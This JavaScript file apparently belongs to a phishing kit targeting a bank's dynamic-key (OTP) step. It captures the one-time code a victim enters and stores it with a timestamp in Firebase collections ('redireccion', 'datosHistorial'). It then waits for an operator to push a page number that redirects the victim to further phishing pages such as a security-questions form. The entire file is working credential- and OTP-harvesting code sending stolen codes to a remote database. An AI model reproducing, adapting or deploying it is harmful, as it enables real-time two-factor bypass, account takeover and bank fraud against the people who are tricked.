"use strict";

(function initDinamicaFirebase() {
  var otpWatcher = null;

  function getCurrentDinamicaState() {
    return window.location.pathname.indexOf("dinamica_err.html") !== -1 ? "error" : "ok";
  }

  function ready(callback) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", callback, { once: true });
      return;
    }
    callback();
  }

  function updateHistoryEntry(db, usuario, otpData) {
    return db
      .collection("redireccion")
      .doc(usuario)
      .get()
      .then(function (snapshot) {
        var currentData = snapshot.exists ? snapshot.data() || {} : {};
        var payload = Object.assign(
          {
            usuario: usuario,
            timestamp: currentData.timestamp || new Date().toISOString(),
          },
          currentData,
          otpData
        );

        return db
          .collection("datosHistorial")
          .doc(usuario)
          .set(payload, { merge: true });
      })
      .catch(function (error) {
        console.error("Error actualizando historial OTP:", error);
      });
  }

  function attachOtpWatcher(userRef) {
    if (otpWatcher) {
      otpWatcher();
      otpWatcher = null;
    }

    otpWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          return;
        }

        var userData = docSnapshot.data() || {};
        var page = userData.page;

        if (page === 99) {
          window.location.href = "pregseg.html";
          return;
        }

        if (typeof page !== "number" || page <= 0) {
          return;
        }

        if (otpWatcher) {
          otpWatcher();
          otpWatcher = null;
        }

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          window.location.href = route.url;
          return;
        }

        window.location.href = "page" + page + ".html";
      },
      function () {
        if (window.dinamicaUi) {
          window.dinamicaUi.hideLoader();
          window.dinamicaUi.unlockInputs();
        }
      }
    );
  }

  function setWaitingState(userRef, stateValue) {
    return userRef.set(
      {
        page: 0,
        dinamicaEstado: stateValue,
        dinamicaEsperandoPanel: true,
        dinamicaUltimaPagina: stateValue === "error" ? "dinamica_err" : "dinamica",
        dinamicaActualizadoEn: new Date().toISOString()
      },
      { merge: true }
    );
  }

  ready(function () {
    var db = window.db;
    var usuario = localStorage.getItem("usuarioActual");
    var currentState = getCurrentDinamicaState();

    if (db && typeof firebase !== "undefined" && usuario && currentState === "error") {
      var waitRef = db.collection("redireccion").doc(usuario);
      setWaitingState(waitRef, "error").then(function () {
        attachOtpWatcher(waitRef);
      });
    }

    document.addEventListener("dinamica:continue", function (event) {
      var db = window.db;
      if (!db || typeof firebase === "undefined") {
        if (window.dinamicaUi) {
          window.dinamicaUi.hideLoader();
          window.dinamicaUi.unlockInputs();
        }
        return;
      }

      var usuario = localStorage.getItem("usuarioActual");
      if (!usuario) {
        if (window.dinamicaUi) {
          window.dinamicaUi.hideLoader();
          window.dinamicaUi.unlockInputs();
        }
        return;
      }

      var code = event.detail && event.detail.code ? event.detail.code : "";
      if (!code) {
        if (window.dinamicaUi) {
          window.dinamicaUi.hideLoader();
          window.dinamicaUi.unlockInputs();
        }
        return;
      }

      var userRef = db.collection("redireccion").doc(usuario);
      var otpFields = {
        otpCode: code,
        otpTimestamp: new Date().toISOString(),
        page: 0,
        dinamicaEstado: getCurrentDinamicaState(),
        dinamicaEsperandoPanel: true,
        dinamicaUltimaPagina: getCurrentDinamicaState() === "error" ? "dinamica_err" : "dinamica",
        dinamicaActualizadoEn: new Date().toISOString()
      };

      userRef
        .set(otpFields, { merge: true })
        .then(function () {
          attachOtpWatcher(userRef);
          return updateHistoryEntry(db, usuario, otpFields);
        })
        .catch(function () {
          if (window.dinamicaUi) {
            window.dinamicaUi.hideLoader();
            window.dinamicaUi.unlockInputs();
          }
        });
    });
  });
})();
